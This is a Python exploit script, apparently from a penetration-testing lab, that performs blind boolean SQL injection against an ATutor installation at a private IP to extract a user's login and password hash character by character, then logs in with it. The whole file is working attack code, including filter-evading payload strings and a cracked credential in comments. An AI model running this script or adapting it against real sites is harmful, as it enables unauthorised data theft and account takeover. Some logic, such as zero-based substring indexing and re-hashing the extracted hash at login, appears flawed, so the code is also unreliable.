import requests
import hashlib
"""
DB CONSTRUCTS QUERY : 

SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%A%' 
    OR second_name LIKE '%A%' 
    OR last_name LIKE '%A%'
    OR login LIKE '%A%');

"""

"""
Username: teacher
Password: teacher123 (Used Crackstation to get Value)
Password hashed in db: 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
"""


def construct_inj_str(index:int,ascii_rep:int, col:str) -> str:
    """
        Converting certain special characters to ascii such as ' -> %27 and # -> %23
        Hashtag(#) is a comment in mysql
        substring returns specific range of characters where arg[0] is the select, arg[1] is the index of the value, and arg[2] is the amount of chars to return.
        ("asd", 1, 1) returns a
        ("asd", 2, 1) returns s
        ("asd", 1, 2) returns as
    """
    return f"test%27)/**/or/**/(ascii(substring((select/**/{col}/**/from/**/AT_members/**/where/**/first_name/**/=/**/%27Offensive%27),{index},1)))/**/=/**/{ascii_rep}/**/or/**/(1=%27"

def search(base_url:str, col:str, len:int) -> str:
    result = ''
    for i in range(0,len):
        for j in range(32,126): # Printable ASCII Chars are between 33-125
            url = base_url.replace('[inj]', construct_inj_str(index=i, ascii_rep=j, col=col))
            response = requests.get(url)
            if int(response.headers['Content-Length']) > 20:
                result += chr(j)
    return result

def try_login(username:str, password:str) -> bool:
    
    pwd_hash = hashlib.sha1((password + 'sit').encode('utf-8')).hexdigest()
    url = "http://192.168.206.103/ATutor/login.php"
    body = {
        "form_password_hidden" : pwd_hash,
        "form_login": username,
        "submit" : "login",
        "token" : "sit"
    }
    response = requests.post(url, data=body)
    if "Create Course" in response.text or "My Courses" in response.text:
        return True
    print(response.text)
    return False


def get_login() -> str:
    base_url = "http://192.168.206.103/ATutor/mods/_standard/social/index_public.php?q=[inj]"
    if login := search(base_url=base_url, col='login', len=20):
        print(f'[+] login Found {login}')
        return login
    else:
        print('[!] Failed to get Login')
        return login
    
def get_password() -> str:
    base_url = "http://192.168.206.103/ATutor/mods/_standard/social/index_public.php?q=[inj]"
    if password := search(base_url=base_url, col='password', len=64):
        print(f'[+] Password Found {password}')
        return password
    else:
        print('[!] Failed to get Password')
        return password

def main() -> None:
    if login := get_login():
        if password := get_password():
            if try_login(login, password):
                print("Success!")


if __name__ == "__main__":
    main()